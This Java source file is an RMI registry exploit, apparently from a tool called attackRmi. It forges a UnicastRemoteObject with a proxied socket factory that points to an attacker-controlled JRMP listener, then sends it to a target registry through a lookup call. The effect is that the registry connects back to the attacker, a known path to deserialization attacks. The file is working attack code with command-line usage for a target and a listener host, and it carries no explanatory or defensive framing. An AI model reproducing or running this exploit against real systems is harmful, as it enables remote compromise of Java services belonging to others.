package com.wu.attackRmi.Exploit;


import com.wu.attackRmi.utils.Stub;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.server.ObjID;
import java.rmi.server.RMIServerSocketFactory;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.rmi.server.UnicastRemoteObject;
import java.util.Random;

public class AttackRegistryByLookupAndUnicastRefRemoteObject {
    public static void main(String[] args) throws Exception {

        if (args.length != 4) {
            printUsage();
            System.exit(64);
        }

        final String registryHost = args[0];
        final int registryPort = Integer.parseInt(args[1]);
        final String JRMPListenHost = args[2];
        final int JRMPListenPort = Integer.parseInt(args[3]);

        System.out.println("Attacking: "+ registryHost + ":" + registryPort);
        System.out.println("JRMPServer: "+ JRMPListenHost + ":" + JRMPListenPort);

        attack(registryHost, registryPort, JRMPListenHost, JRMPListenPort);
    }

    public static void attack(String registryHost, int registryPort, String JRMPListenHost, int JRMPListenPort) throws Exception{
        ObjID id = new ObjID(new Random().nextInt()); // RMI registry

        TCPEndpoint te = new TCPEndpoint(JRMPListenHost, JRMPListenPort);
        UnicastRef refObject = new UnicastRef(new LiveRef(id, te, false));

        RemoteObjectInvocationHandler myInvocationHandler = new RemoteObjectInvocationHandler(refObject);

        RMIServerSocketFactory handcraftedSSF = (RMIServerSocketFactory) Proxy.newProxyInstance(RMIServerSocketFactory.class.getClassLoader(), new Class[] { RMIServerSocketFactory.class, Remote.class }, myInvocationHandler);

        Constructor<?> constructor = UnicastRemoteObject.class.getDeclaredConstructor(null);
        constructor.setAccessible(true);
        UnicastRemoteObject myRemoteObject = (UnicastRemoteObject) constructor.newInstance(null);
        Field privateSsfField = UnicastRemoteObject.class.getDeclaredField("ssf");
        privateSsfField.setAccessible(true);
        privateSsfField.set(myRemoteObject, handcraftedSSF);

        ObjID objID = new ObjID(0);
        Stub.exploit(registryHost, registryPort, myRemoteObject, objID, 2, 4905912898345647071L);
    }

    private static void printUsage() {
        System.err.println("AttackRegistryByLookupAndUnicastRefRemoteObject");
        System.err.println("Usage: java -cp attackRmi.jar com.wu.attackRmi.Exploit.AttackRegistryByLookupAndUnicastRefRemoteObject [registryHost] [registryPort] [JRMPListenHost] [JRMPListenPort]");
    }
}
